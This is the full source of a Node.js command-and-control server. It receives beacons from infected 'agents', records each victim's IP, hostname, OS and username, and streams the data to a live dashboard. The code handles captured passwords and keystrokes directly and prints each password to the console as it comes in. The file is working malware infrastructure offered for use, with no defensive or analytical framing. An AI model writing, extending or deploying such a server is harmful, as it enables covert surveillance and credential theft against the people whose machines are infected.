#!/usr/bin/env node
/**
 * C2 Server v1.0
 * - Dashboard at /
 * - Beacon at POST /beacon
 * - WebSocket real-time push
 */
import http from 'http'
import fs from 'fs'
import path from 'path'
import net from 'net'
import { createHash } from 'crypto'
import { fileURLToPath } from 'url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const DB_FILE   = path.join(__dirname, '../data/agents.json')
const LOG_DIR   = path.join(__dirname, '../data/logs')
const DASH_HTML = path.join(__dirname, 'dashboard.html')
const PORT      = parseInt(process.argv[2] || '7070')

fs.mkdirSync(path.join(__dirname,'../data'), {recursive:true})
fs.mkdirSync(LOG_DIR, {recursive:true})

function loadDB() { try { return JSON.parse(fs.readFileSync(DB_FILE,'utf8')) } catch { return {} } }
function saveDB(db) { fs.writeFileSync(DB_FILE, JSON.stringify(db,null,2)) }

function recordAgent(agentId, ip, data) {
  const db = loadDB()
  if (!db[agentId]) db[agentId] = { id:agentId, ip, first_seen:new Date().toISOString(), last_seen:null, os:'', hostname:'', username:'', events:[] }
  db[agentId].last_seen = new Date().toISOString()
  db[agentId].ip = ip
  if (data.os)       db[agentId].os = data.os
  if (data.hostname) db[agentId].hostname = data.hostname
  if (data.username) db[agentId].username = data.username
  if (data.type) {
    db[agentId].events.push({ t:new Date().toISOString(), ...data })
    if (db[agentId].events.length > 500) db[agentId].events = db[agentId].events.slice(-500)
  }
  saveDB(db)
  fs.appendFileSync(path.join(LOG_DIR, agentId+'.log'), JSON.stringify({t:new Date().toISOString(),ip,...data})+'\n')
  return db[agentId]
}

// WS clients
const wsClients = new Set()
function wsHandshake(sock, key) {
  const acc = createHash('sha1').update(key.trim()+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64')
  sock.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: '+acc+'\r\n\r\n')
}
function wsSend(sock, obj) {
  const data = Buffer.from(JSON.stringify(obj))
  const header = data.length < 126
    ? Buffer.from([0x81, data.length])
    : Buffer.from([0x81, 126, data.length>>8, data.length&0xff])
  try { sock.write(Buffer.concat([header, data])) } catch {}
}
function broadcast(obj) { wsClients.forEach(s => wsSend(s, obj)) }

const server = http.createServer((req, res) => {
  const p = new URL(req.url, 'http://x').pathname
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,X-Agent-ID')
  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end() }

  if (p === '/' || p === '/dashboard') {
    const html = fs.readFileSync(DASH_HTML)
    res.writeHead(200, {'Content-Type':'text/html;charset=utf-8'})
    return res.end(html)
  }

  if (p === '/beacon' && req.method === 'POST') {
    let body = ''
    req.on('data', c => body += c)
    req.on('end', () => {
      try {
        const data = JSON.parse(body)
        const agentId = req.headers['x-agent-id'] || data.id || createHash('md5').update(req.socket.remoteAddress||'?').digest('hex').slice(0,8)
        const ip = req.socket.remoteAddress || '?'
        recordAgent(agentId, ip, data)
        broadcast({ type:'new_event', agentId, event:{ t:new Date().toISOString(), ...data } })
        broadcast({ type:'agents_update', data:loadDB() })
        const preview = data.type==='password' ? ' 🔑 '+data.password : (data.type==='keystroke' ? ' '+data.key : '')
        console.log('[+] '+agentId+' | '+ip+' | '+data.type+preview)
        res.writeHead(200, {'Content-Type':'application/json'})
        res.end('{"ok":true}')
      } catch(e) { res.writeHead(400); res.end('bad') }
    })
    return
  }

  if (p === '/api/agents') {
    res.writeHead(200, {'Content-Type':'application/json'})
    return res.end(JSON.stringify(loadDB()))
  }

  res.writeHead(404); res.end()
})

server.on('upgrade', (req, sock) => {
  const key = req.headers['sec-websocket-key']
  if (!key) return sock.destroy()
  wsHandshake(sock, key)
  wsClients.add(sock)
  wsSend(sock, { type:'agents_update', data:loadDB() })
  sock.on('close', () => wsClients.delete(sock))
  sock.on('error', () => wsClients.delete(sock))
  const ping = setInterval(() => {
    try { sock.write(Buffer.from([0x89, 0x00])) } catch { clearInterval(ping) }
  }, 25000)
})

server.listen(PORT, '0.0.0.0', () => {
  console.log('\x1b[96m╔═══════════════════════════════════════╗')
  console.log('║  C2 Dashboard v1.0 — RUNNING          ║')
  console.log('╠═══════════════════════════════════════╣')
  console.log('║  Dashboard : \x1b[92mhttp://0.0.0.0:'+PORT+'\x1b[96m   ║')
  console.log('║  Beacon    : POST http://0.0.0.0:'+PORT+'/beacon ║')
  console.log('╚═══════════════════════════════════════╝\x1b[0m')
})
